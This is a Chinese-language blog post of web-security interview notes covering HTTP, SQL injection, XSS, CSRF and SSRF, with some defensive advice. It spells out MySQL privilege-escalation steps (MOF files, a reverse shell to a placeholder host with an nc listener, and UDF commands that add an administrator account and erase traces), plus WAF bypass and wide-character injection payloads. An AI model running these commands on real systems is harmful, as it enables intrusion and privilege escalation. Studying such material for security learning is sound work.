---
layout: post
title: "WEB 安全面试复习笔记"
date: 2019-5-6 20:49:43
author: co0ontty
categories: WEB ALL
tags: WEB ALL 
---
## 对 Web 安全的理解
我觉得 Web 安全首先得懂 Web、第三方内容、Web 前端框架、Web 服务器语言、Web 开发框架、Web 应用、Web 容器、存储、操作系统等这些都要了解，然后较为常见且危害较大的，SQL 注入，XSS 跨站、CSRF 跨站请求伪造等漏洞要熟练掌握。  
第三方内容: 广告统计、mockup 实体模型  
>Web 前端框架: jQuery 库、BootStrap  
Web 服务端语言: aps.net、php  
Web 开发框架: Diango/Rails/Thinkphp  
Web 应用: BBS ( discuz、xiuno ) / CMS ( 帝国、织梦、动易、Joomla ) / BLOG ( WordPress、Z-Blog、emlog )  
Web 容器: Apache ( php )、IIS ( asp )、Tomcat ( java ) -- 处理从客户端发出的请求  
存储：数据库存储 / 内存存储 / 文件存储  
操作系统: linux / Windows  

## HTTP  
### HTTP 常见状态码
>1xx：信息提示，表示请求已被成功接收，继续处理。  
2xx：成功，服务器成功处理了请求  
3xx：重定向，告知客户端所请求的资源已经移动  
4xx：客户端错误状态码，请求了一些服务器无法处理的东西。  
5xx：服务端错误，描述服务器内部错误  

### HTTP 请求
>请求行 ( 请求方法 )、请求头 ( 消息报头 ) 和请求正文   

### HTTP 响应
>响应行，响应头 ( 消息报头 ) 和响应正文 ( 消息主题 )  

### GET 和 POST：
>GET 方法用于获取请求页面的指定信息，如点击链接
>POST 方法是有请求内容的，由于向服务器发送大量数据，如提交表单

## 数据库  
基本的 SQL 语句：
>增：INSERT INTO table_name (列 1, 列 2,...) VALUES (值 1, 值 2,……)  
删：DELETE FROM 表名称 WHERE 列名称 = 值  
改：UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值  
查：SELECT 列名称 FROM 表名称   

mysql 默认自带表:  
> information_schema、performance_schema、sys、mysql   

information_schema 数据库：
 mysql 自带的，它提供了访问元数据库的方式。  
sys 数据库 ：
目标是把 performance_schema 的把复杂度降低
>sys_config 用于 sys schema 库的配置

sys 中的两种表：
> 1.字母开头： 适合人阅读，显示是格式化的数
2.x$开头 ： 适合工具采集数据，原始类数据

mysql 提权方式：  
***mof 提权***   
拿到 Webshell 后：   
1、找一个可写目录上传 mof 文件，例如上传到 C:/Windows/nullevt.mof  
2、执行 load_file 及 into dumpfile 把文件导出到正确的位置即可:
>Select load_file('C:/Windows/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'  

执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后 3389 连接即可
***反弹端口提权***   
1、拿到 mysql root 权限，无法通过网站 Getshell，利用 mysql 客户端工具连接 mysql 服务器，然后执行下面的操作：   
```php
select backshell ("yourip",2010)
```   
2、本地监听你反弹的端口   
```bash
nc -vv -l -p 2010     
```   
成功后，你将获得一个 system 权限的 cmdshell  

***Mysql udf 提权*** 

目录位置:

c:\windows\system32

1、最常见的是直接使用 udf.php (https://download.csdn.net/download/fly_hps/10752511 ) 此类的工具来执行 udf 提权

具体如下:

连接到 mysql 以后，先导出 udf.dll 到 c:\windows\system32 目录下。

2、创建相应的函数并执行命令，具体如下：
```php
create function cmdshell returns string soname 'udf.dll';
select cmdshell ('net user wintry wintry /add');
select cmdshell ('net localgroup administrators wintry /add');
drop function cmdshell;
delete from mysql.func where name ='cmdshell';
```
### sql 注入总结
####总体见解：
1.只要是支持批处理 SQL 指令的数据库服务器，都有可能受到此种手法的攻击。  
2.注入的本质，是把用户输入数据作为代码执行。有两个关键条件：第一个是用户能控制输入；第二是原本程序要执行的代码，拼接了用户输入的数据，把数据当代码执行了。（出自吴瀚清《白帽子讲 WEB 安全》）  
3.错误的回显是敏感信息，是攻击者了解某网站 web 服务器的重要手段。  
4.最常见的盲注验证方法是，构造简单的条件语句，根据返回页面是否发生变化，判断 SQL 语句是否得到执行。例如http://a.b.c/item.php?id=2 中，执行的 SQL 为：select title,body FROM item where ID =2 可以 将域名改为http://a.b.c/item.php?id=2or 1=1，通过注入数据，再对返回页面进行差异结果比较。两次结果不一样，证明存在注入漏洞。  
####SQL 注入原理：  
SQL 注入攻击指的是通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。（从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取你想到得到的资料）  
### SQL 注入漏洞常见类型：   
1.没有正确过滤转义字符   
2.Incorrecttypehandling   
3.数据库服务器中的漏洞   
4.盲目 SQL 注入式攻击  
5.条件响应  
6.条件性差错  
7.时间延误   
### SQL 注入点的类型：  
1，数字型注入点  
2，字符型注入点  
3，搜索型注入点：  
这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示的链接地址，而是直接通过搜索框表单提交。  
SQL 注入原因：  
①不当的类型处理；  
②不安全的数据库配置；  
③不合理的查询集处理；  
④不当的错误处理；  
⑤转义字符处理不合适；  
⑥多个提交处理不当。
### SQL 注入一般步骤：
发现 SQL 注入位置；  
·判断环境，寻找注入点，判断数据库类型；    
其次，根据注入参数类型，在脑海中重构 SQL 语句的原貌，按参数类型主要分为下面三种：   
(A) ID=49 这类注入的参数是数字型，   
SQL 语句原貌大致如下：Select * from 表名 where 字段=49 注入的参数为 ID=49 And [查询条件]，即是生成语句：Select * from 表名 where 字段=49 And [查询条件]   
(B) Class=连续剧这类注入的参数是字符型，   
SQL 语句原貌大致概如下：Select * from 表名 where 字段=’连续剧’注入的参数为 Class=连续剧’ and [查询条件]and‘’=’，即是生成语句：Select * from 表名 where 字段=’连续剧’ and [查询条件] and‘’=’’   
(C)搜索时没过滤参数的，   
如 keyword=关键字，SQL 语句原貌大致如下：Select * from 表名 where 字段 like ’%关键字%’注入的参数为 keyword=’ and [查询条件] and ‘%25’=’，即是生成语句：Select * from 表名 where 字段 like ’%’ and [查询条件]and‘%’=’%’·发现 WEB 虚拟目录，将查询条件替换成 SQL 语句，猜解表名，猜列名，猜目标目录的字段长度。
### 数据库攻击常用技巧： 
猜表名，确认表名，列名  
·上传 ASP 木马，留下后门；  
·得到管理员权限，窃取数据；  
ASP 木马只有 USER 权限，要想获取对系统的完全控制，还要有系统的管理员权限。怎么办？  
提升权限的方法有很多种：  
上传木马，修改开机自动运行的.ini 文件（它一重启，便死定了）；  
复制 CMD.exe 到 scripts，人为制造 UNICODE 漏洞；下载 SAM 文件，破解并获取 OS 的所有用户名密码；   等等，视系统的具体情况而定，可以采取不同的方法。
### 如何判断 sqli 注入，有哪些方法？
添加单引号，双引号，order by, sleep，benchmark，运算符，修改数据类型，报错注入语句测试
### mysql 的用户名密码是放在哪张表里面？
mysql 数据库下的 user 表。

### sql 注入过滤绕过总结  
#### 注释符号绕过：
常用的注释符有  
```php 
-- 注释内容
# 注释内容
/*注释内容*/
```
#### 大小写绕过：  
常用于 waf 的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。  
例如：waf 过滤了关键字 select，可以尝试使用 Select 等绕过。  
```php
mysql> select * from users where id = -1 union select 1,2,3
    -> ;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
1 row in set (0.00 sec)

#大小写绕过
mysql> select * from users where id = -1 union Select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+

--------------------- 
```
#### 内联注释绕过:  
内联注释就是把一些特有的仅在 MYSQL 上的语句放在 /*!...*/中，这样这些语句如果在其它数据库中是不会被执行，但在 MYSQL 中会执行。
```php 
mysql> select * from users where id = -1 union /*!select*/ 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
--------------------- 
```
#### 双写关键字绕过:  
在某一些简单的 waf 中，将关键字 select 等只使用 replace()函数置换为空，这时候可以使用双写关键字绕过。例如 select 变成 seleselectct，在经过 waf 的处理之后又变成 select，达到绕过的要求。  
#### 特殊编码绕过:    
十六进制绕过  
```php
mysql> select * from users where username = 0x7465737431;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | test1    | pass     |
+----+----------+----------+
```
ascii 编码绕过  
Test 等价于 CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)  
tip:好像新版 mysql 不能用了
#### 空格过滤绕过:  
一般绕过空格过滤的方法有以下几种方法来取代空格  
```php
/**/
()
回车(url编码中的%0a)
`(tap键上面的按钮)
tap
两个空格
```
实例:  
```php
mysql> select/**/*/**/from/**/users; 

mysql> select(id)from(users); #注意括号中不能含有*  

mysql> select
    -> *
    -> from 
    -> users
    -> where 
    -> id = 1;

mysql> select`id`from`users`where`id`=1;  
``` 
#### 过滤 or and xor not 绕过:  
>and = &&  
or = ||  
xor = | # 异或  
not = !  
#### 过滤等号=绕过  
#####不加通配符的 like 执行的效果和=一致，所以可以用来绕过。  
正常加上通配符的 like：  
```php
mysql> select * from users where username like "test%";
```
#####使用大小于号来绕过：  
```php
mysql> select * from users where id > 1 and id < 3;
```
### 如何防御 SQL 漏洞？
核心原则：数据代码分离原则。 
1.最佳方法：预编译语句，绑定变量。使用预编译的 SQL 语句，SQL 的语意不会变化，攻击者无法改变 SQL 的结构，即使攻击者插入了类似于’or ‘1’=’1 的字符串，也只会将此字符串作为 username 查询。 
2.从存储过程来防御：先将 SQL 语句定义在数据库中，存储过程中可能也存在注入问题，应该尽量避免在存储过程中使用动态 SQL 语句。 
3.从数据类型角度来防御：限制数据类型，并统一数据格式。 
4.从开发者角度来防御：开发时尽量用安全函数代替不安全函数，编写安全代码。危险函数，常见的执行命令函数，动态访问函数，如 C 语言中的 system(),PHP 的 eval()，JSP 的 include()导致的代码越权执行，都是注入。 
5.从数据库管理者角度来防御：的最小权限原则，避免 root,dbowner 等高权限用户直接连接数据库。 
### 为什么有的时候没有错误回显，用 php 举例 

php 的配置文件 php.ini 进行了修改，display_errors = On 修改为 display_errors = off 时候就没有报错提示。
在 php 脚本开头添加 error_reporting(0); 也可以达到关闭报错的作用。

宽字符注入的原理？如何利用宽字符注入漏洞，payload 如何构造？

通俗讲，gbk，big5 等编码占了两个字节，sql 语句进后端后对单引号等进行了转义，转义\为%5C，当前面的%xx 与%5C 能结合成两个字节的字符时候，就可以使后面的单引号逃逸，从而造成注入。比较常见的 gbk，%df' =>
%df%5c%27 => 運' 。已经可以单引号了，剩下的就和普通注入差不多了。

### sql 的 bypass 技巧

这种太多了，网上一搜一大把。主要还是看目标站点的过滤和防护，常见 bypass 可以是
```php
/**/ 替换空格，  
/*!00000union*/ 等于union，  
或者利用前端过滤，添加尖括号'<  >'。
大小写什么的都太常见了，如果过滤了函数或者关键字，可以尝试其他能达到效果的同等函数，关键字比如or 1=1可以用||1替换，或者用运算符比如/，%达到相同的效果。总之，还是看要求。
```
## CRLF 注入的原理

CRLF 是回车+换行的简称。碰得比较少，基本没挖到过这种洞，简而言之一般是可以通过提交恶意数据里面包含回车，换行来达到控制服务器响应头的效果。碰到过潜在的 CRLF 都是提交回车和换行之后就 500 了。CRLF 的利用可以是 XSS，恶意重定向 location，还有 set-cookie.

## XSS 发生的场景

个人理解是对用户提交数据为进行安全的过滤然后直接输入到页面当中，造成 js 代码的执行。至于具体场景，有输出的地方就有可能被 xss 的风险。


## 如果给你一个 XSS 盲打漏洞，但是返回来的信息显示，他的后台在内网，并且只能内网访问，如何利用这个 xss？

github 有一些现成的 xss 扫描内网端口的脚本，可以参考利用，再根据探测出来的信息进一步利用，比如开了 redis 等，再就是利用漏洞去 getshell.

## php.ini 可以设置哪些安全特性？
关闭报错，设置 open_basedir，禁用危险函数，打开 gpc。有具体的文章介绍安全配置这一块，属于运维的工作范围。
## php 的%00 截断的原理？
存在于 5.3.4 版本下，一般利用在文件上传时文件名的截断，或者在对文件进行操作时候都有可能存在 00 阶段的情况。 如 filename=test.php%00.txt 会被截断成 test.php，00 后面的被忽略。系统在对文件名读取时候，如果遇到 0x00,就会认为读取已经结束了。
## webshell 的检测，有哪些方法？
个人知道的大体上分为静态检测和动态检测两种。静态检测比如查找危险函数，如 eval，system 等。动态检测是检测脚本运行时要执行的动作，比如文件操作，socket 操作等。具体方法可以是通过 D 盾或者其他查杀软件进行查杀，现在也有基于机器学习的 webshell 识别。
## CSRF 漏洞的本质是什么？
CSRF 即跨站请求伪造，以受害者的身份向服务器发送一个请求。本质上个人觉得是服务端在执行一些敏感操作时候对提交操作的用户的身份校检不到位。
### 防御 CSRF 都有哪些方法，JAVA 是如何防御 CSRF 漏洞的，token 一定有用吗？
防御 CSRF 一般是加上 referer 和 csrf_token.
jAVA 不太懂。具体可以参考这篇 CSRF 攻击的 CSRF 攻击的应对之道  
## ssrf 漏洞判断的方法：   
### 介绍：  
SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）  
### 形成的原因：  
由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。  
